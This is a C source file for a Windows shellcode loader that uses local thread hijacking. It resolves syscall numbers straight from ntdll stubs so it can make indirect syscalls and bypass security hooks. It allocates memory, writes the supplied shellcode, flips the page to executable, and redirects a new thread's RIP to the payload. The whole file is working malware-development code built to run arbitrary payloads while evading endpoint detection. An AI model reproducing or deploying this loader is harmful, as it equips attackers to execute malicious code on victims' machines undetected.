#include "local_thread.h"

VOID Dumbo(VOID)
{
	MessageBoxA(NULL, "Local Thread Hijacking Successful!", "Hijack Me", MB_OK);
	return;
}

VOID IndirectPrelude(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN, OUT PUINT_PTR FuncSys)
{

	DWORD SyscallNumber = 0;

	UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };

	UINT_PTR NtFunctionAddress = 0;

	NtFunctionAddress = (UINT_PTR)GetProcAddress(mod, FuncName);
	if (NtFunctionAddress == 0)
	{
		WARN("GetProcAddress Failed! With an Error: %ld", GetLastError());
		return;
	}

	BYTE byte4 = ((PBYTE)NtFunctionAddress)[4];
	BYTE byte5 = ((PBYTE)NtFunctionAddress)[5];
	*FuncSSN = (byte5 << 8) | byte4;

	*FuncSys = NtFunctionAddress + 0x12;


	if (memcmp(SyscallOpcodes, (PVOID)*FuncSys, sizeof(SyscallOpcodes)) == 0) {
		INFO("[0x%p] [0x%p] [0x%0.3lx] -> %s", (PVOID)NtFunctionAddress, (PVOID)*FuncSys, *FuncSSN, FuncName);
		return;
	}

	else {
		WARN("expected syscall signature: \"0x0f05\" didn't match.");
		return;
	}


	// courtesy of Crr0ww for this function


}

BOOL LocalThreadHijack
(
	IN HANDLE hProcess,
	OUT HANDLE* hThread,
	OUT PVOID* pAddress,
	IN PBYTE pShellcode,
	IN SIZE_T SizeofShellcode
)

{

	SIZE_T sBytesWritten = NULL;
	DWORD dwOldProt = NULL;
	HMODULE    NtdllHandle = NULL;
	NTSTATUS STATUS = NULL;
	PVOID rBuffer = NULL;
	PUCHAR localBuf = NULL;
	SIZE_T origSize = SizeofShellcode;
	SIZE_T regionSize = SizeofShellcode;
	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);


	localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SizeofShellcode);
	if (!localBuf) {
		WARN("HeapAlloc failed");
		return FALSE;
	}
	memcpy(localBuf, pShellcode, SizeofShellcode);


	NtdllHandle = GetModuleHandleW(L"ntdll.dll");
	if (NULL == NtdllHandle) {
		WARN("GetModuleHandleW", GetLastError());
		return FALSE;
	}
	OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);


	IndirectPrelude(NtdllHandle, "NtAllocateVirtualMemory", &fn_NtAllocateVirtualMemorySSN, &fn_NtAllocateVirtualMemorySyscall);
	IndirectPrelude(NtdllHandle, "NtWriteVirtualMemory", &fn_NtWriteVirtualMemorySSN, &fn_NtWriteVirtualMemorySyscall);
	IndirectPrelude(NtdllHandle, "NtProtectVirtualMemory", &fn_NtProtectVirtualMemorySSN, &fn_NtProtectVirtualMemorySyscall);
	IndirectPrelude(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN, &g_NtCreateThreadExSyscall);


	/*----------------------------------------------------------[Allocating Virtual Memory]------------------------------------------------------*/

	STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	INFO("Allocated [%zu] Bytes to Virtual Memory!", SizeofShellcode);

	/*-----------------------------------------------------------[Writing Virtual Memory]------------------------------------------------------------*/

	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, localBuf, origSize, &sBytesWritten);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}


	OKAY("Wrote [%zu] Bytes to Virtual Memory", SizeofShellcode);

	/*----------------------------------------------------------[Changing Protecting Permissions]-----------------------------------------------------*/

	STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &dwOldProt);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	INFO("Changed Allocation Protection from [RW] to [RX]");

	/*----------------------------------------------------------[Creating a Thread Inside our Dummy Function]-------------------------------------------*/

	STATUS = NtCreateThreadEx(hThread, THREAD_ALL_ACCESS, &OA, hProcess, (LPTHREAD_START_ROUTINE)Dumbo, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtCreateThreadEx Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}

	INFO("Successfully Created Thread Inside Dumbo!");

	*pAddress = rBuffer;

	HeapFree(GetProcessHeap(), 0, localBuf);
	return TRUE;
}


BOOL HijackThread
(
	IN HANDLE hThread,
	IN PVOID pAddress
)

{

	HMODULE    NtdllHandle = NULL;
	NTSTATUS		STATUS = NULL;
	ULONG suspendedCount = 0;

	CONTEXT ThreadCtx;
	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_FULL;


	if (!hThread || hThread == INVALID_HANDLE_VALUE || !pAddress) {
		WARN("Invalid parameters to HijackThread");
		return FALSE;
	}


	NtdllHandle = GetModuleHandleW(L"ntdll.dll");
	if (NULL == NtdllHandle) {
		WARN("GetModuleHandleW", GetLastError());
		return FALSE;
	}

	IndirectPrelude(NtdllHandle, "NtGetContextThread", &fn_NtGetContextThreadSSN, &fn_NtGetContextThreadSyscall);
	IndirectPrelude(NtdllHandle, "NtSetContextThread", &fn_NtSetContextThreadSSN, &fn_NtSetContextThreadSyscall);
	IndirectPrelude(NtdllHandle, "NtResumeThread", &fn_NtResumeThreadSSN, &fn_NtResumeThreadSyscall);
	IndirectPrelude(NtdllHandle, "NtWaitForSingleObject", &fn_NtWaitForSingleObjectSSN, &fn_NtWaitForSingleObjectSyscall);

	STATUS = NtGetContextThread(hThread, &ThreadCtx);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtGetContextThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}

	printf("[X] | Current RIP Address --> [0x%p]\n", (PVOID)ThreadCtx.Rip);

	OKAY("Successfully got Thread Context!");

	ThreadCtx.Rip = (DWORD64)pAddress;

	printf("[X] | Changed RIP Address --> [0x%p] To Point to Our Payload!\n", (PVOID*)ThreadCtx.Rip);

	STATUS = NtSetContextThread(hThread, &ThreadCtx);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtSetContextThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}

	OKAY("Successfully set Thread Context!");

	STATUS = NtResumeThread(hThread, &suspendedCount);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtResumeThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}


	INFO("Resuming Thread....");

	STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtWaitForSingleObject Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}


	INFO("Waiting for Thread to Finish Executing...");


	return TRUE;
}